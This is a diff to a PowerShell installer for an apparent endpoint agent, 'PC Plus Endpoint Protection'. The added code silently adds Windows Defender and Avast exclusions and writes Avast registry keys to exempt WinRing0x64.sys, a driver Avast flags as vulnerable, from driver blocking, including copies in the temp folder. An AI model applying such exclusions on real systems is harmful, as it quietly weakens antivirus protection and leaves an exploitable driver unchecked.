@@ -67,18 +67,24 @@ Write-Log "STEP 0: Adding antivirus exclusions..."
 # Paths to exclude
 $ExcludePaths = @(
     "$env:ProgramFiles\PC Plus\Endpoint Protection",
+    "$env:ProgramFiles\PC Plus\Endpoint Protection\Service",
+    "$env:ProgramFiles\PC Plus\Endpoint Protection\Tray",
     "$env:ProgramData\PCPlusEndpoint",
     "$env:ProgramData\PCPlusEndpoint\heartbeat.ps1",
     "$env:ProgramFiles\PC Plus\Endpoint Protection\Service\PCPlusService.exe",
-    "$env:ProgramFiles\PC Plus\Endpoint Protection\Tray\PCPlusTray.exe"
+    "$env:ProgramFiles\PC Plus\Endpoint Protection\Tray\PCPlusTray.exe",
+    "$env:TEMP\WinRing0x64.sys",
+    "$env:TEMP\pcplusservice.sys"
 )
+$ExcludeProcesses = @("PCPlusService.exe", "PCPlusTray.exe")
 
 # Windows Defender exclusions
 foreach ($path in $ExcludePaths) {
     try { Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue } catch {}
 }
-try { Add-MpPreference -ExclusionProcess "PCPlusService.exe" -ErrorAction SilentlyContinue } catch {}
-try { Add-MpPreference -ExclusionProcess "PCPlusTray.exe" -ErrorAction SilentlyContinue } catch {}
+foreach ($proc in $ExcludeProcesses) {
+    try { Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue } catch {}
+}
 Write-Log "Windows Defender exclusions added."
 
 # Avast exclusions (registry-based)
@@ -113,6 +119,58 @@ if (Test-Path $avastIniPath) {
             Write-Log "Avast exclusions added via config file."
         }
     } catch { Write-Log "Could not update Avast config: $_" "WARN" }
+}
+
+# Avast vulnerable driver blocking exclusion (separate from file exclusions)
+# Avast flags WinRing0x64.sys (used by LibreHardwareMonitor) as a "vulnerable driver"
+# This requires whitelisting via the Self-Defense / Hardened Mode registry keys
+$avastDriverExclPaths = @(
+    "HKLM:\SOFTWARE\Avast Software\Avast\properties",
+    "HKLM:\SOFTWARE\AVAST Software\Avast\properties"
+)
+$driverPaths = @(
+    "$env:ProgramFiles\PC Plus\Endpoint Protection\Service\WinRing0x64.sys",
+    "$env:ProgramFiles\PC Plus\Endpoint Protection\Service\pcplusservice.sys",
+    "$env:TEMP\WinRing0x64.sys",
+    "$env:TEMP\pcplusservice.sys"
+)
+foreach ($basePath in $avastDriverExclPaths) {
+    if (Test-Path $basePath) {
+        # Exclude from Hardened Mode / Self-Defense driver scanning
+        foreach ($subKey in @("SelfDefense\Exclusions", "HardenedMode\Exclusions", "BlockedDrivers\Exclusions")) {
+            $driverExclPath = "$basePath\$subKey"
+            try {
+                New-Item -Path $driverExclPath -Force -ErrorAction SilentlyContinue | Out-Null
+                $idx = 0
+                foreach ($dp in $driverPaths) {
+                    New-ItemProperty -Path $driverExclPath -Name "Path$idx" -Value $dp -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
+                    $idx++
+                }
+            } catch {}
+        }
+        # Also set the process exclusion paths
+        $procExclPath = "$basePath\ExcludedProcesses"
+        try {
+            New-Item -Path $procExclPath -Force -ErrorAction SilentlyContinue | Out-Null
+            foreach ($proc in $ExcludeProcesses) {
+                New-ItemProperty -Path $procExclPath -Name $proc -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+        } catch {}
+        Write-Log "Avast driver/process exclusions added via registry."
+    }
+}
+
+# Avast command-line exclusion (if AvastUI CLI is available)
+$avastUI = "${env:ProgramFiles}\Avast Software\Avast\AvastUI.exe"
+$avastSvc = "${env:ProgramFiles}\Avast Software\Avast\AvastSvc.exe"
+if (Test-Path $avastSvc) {
+    foreach ($dp in $driverPaths) {
+        try { & "$env:ProgramFiles\Avast Software\Avast\ashCmd.exe" /AddExclusion="$dp" 2>&1 | Out-Null } catch {}
+    }
+    foreach ($proc in $ExcludeProcesses) {
+        try { & "$env:ProgramFiles\Avast Software\Avast\ashCmd.exe" /AddExclusion="$proc" 2>&1 | Out-Null } catch {}
+    }
+    Write-Log "Avast CLI exclusions attempted."
 }
 
 # AVG exclusions (same engine as Avast)
